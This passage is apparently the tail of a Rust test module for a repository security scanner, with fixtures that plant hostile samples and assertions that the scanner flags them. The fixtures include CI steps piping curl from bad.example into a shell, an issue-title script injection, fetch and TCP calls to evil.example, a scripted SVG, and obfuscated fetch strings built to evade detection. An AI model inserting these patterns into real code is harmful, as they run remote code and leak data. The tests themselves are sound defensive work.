            "crates/core/Cargo.toml",
            "[package]\nname = \"curvebook-core\"\n[dependencies]\nweb-sys = {\n  version = \"0.3\",\n  features = [\n    \"Window\",\n    \"RequestInit\",\n  ]\n}\nalias = {\n  version = \"0.1\",\n  package = \"reqwest\"\n}\n",
        );
        fx.write(
            "crates/core/src/stealth.rs",
            "use web_sys::{\n  Window,\n  Headers as H,\n};\npub fn f() { let _ = js_sys::eval(\"fetch('https://bad.example')\"); }\n",
        );
        fx.write(
            "crates/mcp/src/tools.rs",
            "use std::net::TcpStream;\npub fn conn<const N: usize = { 4 }>() {\n  let _ = LOCALHOST;\n  let _ = TcpStream::connect(\"evil.example:443\");\n}\n",
        );
        let utf16_svg: Vec<u8> = "<svg><script>window['fetch']('https&#58;&#47;&#47;evil.example/s'); new Worker ('w.js');</script></svg>"
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect();
        std::fs::write(fx.path.join("apps/curvebook-web/bad.svg"), utf16_svg).unwrap();
        fx.write(
            ".github/actions/evil/action.yml",
            "name: Evil\nruns:\n  using: composite\n  steps:\n    - \"run\": |\n        echo \"${{\n          github.event.issue.title\n        }}\"\n        curl -fsSL https://bad.example/x.sh \\\n          | sh\n",
        );
        fx.write(
            ".github/workflows/ci.yml",
            "name: CI\n\"permissions\":\n  \"contents\": \"write\"\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: \"curl https://bad.example/a | bash\"\n",
        );
        fx.write(
            "packaging/web/_headers",
            "/*\n  Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n  Cross-Origin-Opener-Policy: same-origin\n  Cross-Origin-Embedder-Policy: require-corp\n/override/*\n  Content-Security-Policy: default-src 'self' https:; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n",
        );

        let (_, hits) = run_checks(&fx.path).unwrap();
        assert!(hits.iter().any(|v| v.check == 1 && v.detail.contains("RequestInit")), "{hits:?}");
        assert!(hits.iter().any(|v| v.check == 1 && v.detail.contains("reqwest")), "{hits:?}");
        assert!(hits.iter().any(|v| v.check == 2 && v.path == "crates/core/src/stealth.rs" && v.detail.contains("Headers")), "{hits:?}");
        assert!(hits.iter().any(|v| v.check == 2 && v.path == "crates/core/src/stealth.rs" && v.detail.contains("fetch")), "{hits:?}");
        assert!(hits.iter().any(|v| v.check == 2 && v.path == "crates/mcp/src/tools.rs" && v.detail.contains("loopback")), "{hits:?}");
        assert!(hits.iter().any(|v| v.check == 2 && v.path == "crates/mcp/src/tools.rs" && v.detail.contains("evil.example:443")), "{hits:?}");
        assert!(hits.iter().any(|v| v.check == 3 && v.path == "apps/curvebook-web/bad.svg" && v.detail.contains("fetch")), "{hits:?}");
        assert!(
            hits.iter().any(|v| v.check == 3 && v.path == "apps/curvebook-web/bad.svg" && v.detail.contains("https://evil.example/s")),
            "{hits:?}"
        );
        assert!(hits.iter().any(|v| v.check == 3 && v.path == "apps/curvebook-web/bad.svg" && v.detail.contains("worker(")), "{hits:?}");
        assert!(hits.iter().any(|v| v.check == 4 && v.path == ".github/actions/evil/action.yml" && v.detail.contains("github.event.")), "{hits:?}");
        assert!(hits.iter().any(|v| v.check == 4 && v.path == ".github/actions/evil/action.yml" && v.detail.contains("sha256sum")), "{hits:?}");
        assert!(hits.iter().any(|v| v.check == 4 && v.path == ".github/workflows/ci.yml" && v.detail.contains("write")), "{hits:?}");
        assert!(hits.iter().any(|v| v.check == 4 && v.path == ".github/workflows/ci.yml" && v.detail.contains("sha256sum")), "{hits:?}");
        assert!(hits.iter().any(|v| v.check == 5 && v.path == "packaging/web/_headers" && v.detail.contains("https:")), "{hits:?}");
    }

    #[test]
    fn da_03_07_rust_lexer_extracts_strings_past_char_quotes_raw_prefixes_and_escapes() {
        let fx = create_clean_fixture("da-03-07-tel");
        fx.write(
            "crates/core/src/wasm_evasion.rs",
            concat!(
                "pub fn f() {\n",
                "    let _ = js_sys::eval(\"ok\");\n",
                "    let _q = '\"';\n",
                "    let _a = \"fetch\";\n",
                "    let _b = br#\"websocket\"#;\n",
                "    let _c = cr#\"eventsource\"#;\n",
                "    let _d = \"\\u{66}etch\";\n",
                "    let _e = \"\\x66etch\";\n",
                "    let _f = \"fe\\\n\n    tch\";\n",
                "}\n",
            ),
        );
        fx.write(
            "crates/mcp/src/tools.rs",
            concat!(
                "use std::net::TcpStream;\n",
                "pub fn conn() {\n",
                "    let _ = LOCALHOST;\n",
                "    let _q = '\"';\n",
                "    let _ = TcpStream::connect(\"8.8.8.\\\n\n    8:80\");\n",
                "}\n",
            ),
        );
        let (_, hits) = run_checks(&fx.path).unwrap();
        let wasm_hits: Vec<_> = hits.iter().filter(|v| v.path == "crates/core/src/wasm_evasion.rs").collect();
        assert_eq!(wasm_hits.len(), 6, "expected all 6 obfuscated JS network strings caught, got {wasm_hits:?}");
        assert!(
            hits.iter().any(|v| v.path == "crates/mcp/src/tools.rs" && v.detail.contains("8.8.8.8:80")),
            "expected char-quote + continuation IP literal caught, got {hits:?}"
        );
    }
}
